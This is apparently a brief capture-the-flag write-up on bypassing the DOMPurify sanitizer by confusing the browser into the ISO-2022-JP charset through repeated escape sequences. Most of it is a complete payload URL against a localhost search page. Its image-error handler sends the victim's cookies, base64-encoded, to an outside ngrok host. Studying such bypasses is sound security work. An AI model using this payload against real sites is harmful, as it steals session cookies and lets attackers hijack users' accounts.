We can bypass DOMPurify by using ISO-2022-JP character set.

However, the emoji on the page make the browser assume we are not using this Japanese charset. As such, we can spam escape sequences and convince the browser that we are indeed using the Japanese charset.

A more detailed explanation: https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/

Somewhat similar to the examples listed there however you apply the same idea to DOMPurify as a bypass and this article doesn't really mention the idea of spamming the escape sequences.

Payload:

http://127.0.0.1/search?search=%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%3E%3Cimg%20src=a%20onerror=window.location.href=`https://b7ff-81-102-22-188.ngrok-free.app/${btoa(document.cookie)}`%3E%22%3E%3C/a%3E%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B
